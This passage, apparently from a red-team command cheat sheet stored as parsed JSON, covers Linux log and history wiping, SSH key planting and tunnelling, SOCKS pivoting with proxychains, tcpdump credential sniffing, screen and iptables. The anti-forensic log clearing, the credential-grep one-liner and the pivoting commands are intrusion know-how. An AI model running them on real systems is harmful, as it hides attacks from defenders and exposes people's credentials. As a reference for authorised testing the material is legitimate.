        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mount | grep <DEVICE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run mount to show all mounted devices. See if USB device was mounted successfully",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "umount -f /media/myUSBDevice",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Unmount USB device",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Bash History Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo > /var/log/auth.log",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/var/log/auth.log"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Clear auth.log",
      "level": 0,
      "metadata": {
        "file_paths": [
          "auth.log"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo > ~/.bash_history",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/.bash_h"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Clear current user Bash history",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rm ~/.bash_history -rf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/.bash_h"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete .bash history file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "history -c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Clear current session history",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "export HISTFILESIZE=0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set history max lines to 0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "export HISTSIZE=0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set history max commands to 0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "unset HISTFILE",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Disable history logging (need to logout to take effect)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "kill -9 $$",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kills current session",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ln -sf /dev/null ~/.bash_history",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/.bash_h"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Permanently send all Bash history commands to /dev/null",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/ssh/ssh_known_hosts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File contains system-wide known hosts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "~/.ssh/known_hosts",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File contains previous hosts user has logged into",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh-keygen -t dsa -f <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate SSH DSA keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh-keygen -t rsa -f <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate SSH RSA keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "scp <SOURCE_PATH> <USERNAME>@<IP_ADDRESS>:/<OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload a file using SSH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "scp <USERNAME>@<IP_ADDRESS>:/<INPUT_PATH> <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Download a file using SSH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh <USERNAME>@<IP_ADDRESS> –p <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to target via SSH over a non-standard port",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Setup SSH Keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh-keygen",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Run on local machine)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create SSH keys. After creation command should display where keys were saved with filename",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mkdir ~/.ssh",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/.ssh"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "touch ~/.ssh/authorized_keys",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/.ssh"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Run on remote machine)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Authorized_keys may already exist, if it doesn’t, run this command",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Copy the contents of id_rsa.pub to target remote machine's file: ~/.ssh/authorized_keys",
      "level": 0,
      "metadata": {
        "file_paths": [
          "id_rsa.pub",
          "/.ssh"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "od 700 /root/.ssh",
      "level": 1,
      "metadata": {
        "chapter": "m",
        "chapter_type": "ch"
      }
    },
    {
      "type": "heading",
      "content": "od 600 /root/.ssh/authorized_keys",
      "level": 1,
      "metadata": {
        "chapter": "m",
        "chapter_type": "ch"
      }
    },
    {
      "type": "code_block",
      "content": "(Run on remote machine)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set permissions on newly created folders and files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh -l <FILE_PATH> <USERNAME>@<IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Run on local machine)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run SSH to connect to target. <FILE_PATH> is path to private key created above (NOT the .pub file)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH Forwarding/Tunneling",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Edit /etc/ssh/sshd_config and set:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "AllowTcpForwarding Yes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "GatewayPorts Yes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enable Port Forwarding",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Press three keys at once:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SHIFT~C",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Should drop into a prompt “ssh>”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Then type the tunnel command such as:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh> -R 0.0.0.0:443:127.0.0.1:443",
      "level": 0,
      "metadata": {
        "file_paths": [
          "0.0.0.0",
          "127.0.0.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Setup a tunnel from an already established SSH session",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh –R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE_IP>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "0.0.0.0",
          "127.0.0.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to remote IP address, listen on ALL IP addresses on port 8080, traverse SSH tunnel, and forward traffic to the local loopback IP on 443",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh –L 0.0.0.0:8080:192.168.1.1:3300 root@<REMOTE_IP>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "0.0.0.0",
          "192.168.1.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Listen on all IP interfaces on port 8080 and forward that traffic THROUGH the SSH tunnel connected to <REMOTE_IP>, and finally forward the traffic to 192.168.1.1 on port 3300",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Run against remote computer)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Setup socks proxy on port 1080 on remote host:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh –D 1080 <USERNAME>@<REMOTE_IP>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Run on local computer)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Add the following line to the file /etc/proxychains.conf:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "socks 4 <IP_ADDRESS> <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Run on local computer)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Execute Nmap against 192.168.1.1/24 tunneling traffic through socks proxy:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "proxychains nmap –sT -Pn -n –p80,443 192.168.1.1/24",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NMAP through SSH tunnel using Proxychains",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TCPDump & TCPReplay",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump –i eth0 –XX –w <OUTPUT_PATH>.pcap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Capture packets (headers and data) on eth0 in ASCII and hex and write to file",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump tcp port 80 and dst 2.2.2.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.2.2.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Capture all port 80 (HTTP) traffic with destination set to 2.2.2.2",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump –i eth0 –tttt dst 192.168.1.22 and not dst port 22",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1.22"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from interface eth0 destined for 192.168.1.22 that isn’t port 22 (SSH) traffic.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Print traffic with date/time stamps.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump -i eth0 “icmp[0] == 8”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from interface eth0 that is an ICMP (Ping) reply",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump –i eth0 –c 50 –tttt udp port 53",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show the first 50 packets from interface eth0 that are UDP and port 53 (DNS). Print with date/time stamps.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump -nSX port 443",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that have port 443.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Don’t convert host IPs or port number names (-nn), use absolute TCP sequence numbers, and print packet data",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump -i eth0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump host 1.1.1.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that has host 1.1.1.1 set as a source or destination",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TCPDump & TCPReplay Cont:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump src 1.1.1.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that has host 1.1.1.1 set as a source",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump dst 1.0.0.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.0.0.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that has host 1.0.0.1 set as a destination",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump net 1.2.3.0/24",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.2.3.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that falls into the class C 1.2.3.0/24",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump src port 1025",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that has a source port of 1025",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump port 80 -w <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show traffic from all interfaces that has port 80 set as a source or destination. Save traffic to a file",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user '",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter on the listed ports looking for any data matching the egrep terms listed",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpreplay -i eth0 <INPUT_PATH>.pcap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Replay a pcap with defaults",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpreplay --topspeed -i eth0 <INPUT_PATH>.pcap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Replay pcap as fast as possible",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpreplay --oneatatime --verbose -i eth0 <INPUT_PATH>.pcap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Replay pcap one at a time",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpreplay --loop=10 -i eth0 <INPUT_PATH>.pcap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Replay pcap file 10 times",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpreplay --loop=0 -i eth0 <INPUT_PATH>.pcap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Replay pcap file forever until killed",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://danielmiessler.com/study/tcpdump/",
      "level": 0,
      "metadata": {
        "urls": [
          "https://danielmiessler.com/study/tcpdump/"
        ],
        "file_paths": [
          "//danielmiessler.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Screen",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: In the table below, any reference to “Ctrl+a” == Control-a keyboard combination",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "screen –S <NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start new screen with name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "screen –ls",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List running screens",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "screen –r <NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Attach to screen name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "screen –S <NAME> -X <COMMAND>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send a command to a specific screen name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Keybindings are CTRL+a, let go, and press the hotkey symbol/char",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a ?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "List keybindings (help)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Detach",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a D D",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Detach and logout",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create new window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a C-a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Switch to last active window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a <NAMEorNUMBER>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Switch to window ID or name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a \"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "See windows list and change",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a k",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kill current window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a S",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Split display horizontally",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a |",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Split display vertically",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a tab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Jump to next display",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a X",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remove current region",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a Q",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remove all regions but current",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a A",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Rename the current focused window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Switch to next window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ctrl+a p",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Switch to previous window",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPTables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Iptables is a robust firewall and packet filter program typically installed by default on Linux systems. Iptables can be configured to perform several actions on network packets as they arrive and leave a Linux system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables-save –c > <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Dump iptables (with counters) rules to stdout",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables-restore < <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Restore iptables rules",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –L –v --line-numbers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "List all iptables rules (not including NAT rules) with affected count and line numbers",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –L -t nat --line-numbers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all NAT iptables rules with line numbers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –F",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Flush all iptables rules",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -P <INPUT/FORWARD/OUTPUT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<ACCEPT/REJECT/DROP>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Change default policy for rules that don’t match rules",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -A INPUT -i <INTERFACE_NAME> -m state --state RELATED,ESTABLISHED -j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Allow established connections on INPUT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -D INPUT 7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Delete 7th inbound rule (print line numbers to see rule #’s)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –t raw –L –n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Increase throughput by turning off statefulness",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –P INPUT DROP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Drop all INCOMING packets",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Use ip6tables for IPv6 rules.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPTables Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -A OUTPUT -o <INTERFACE_NAME> -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT",
      "level": 0,
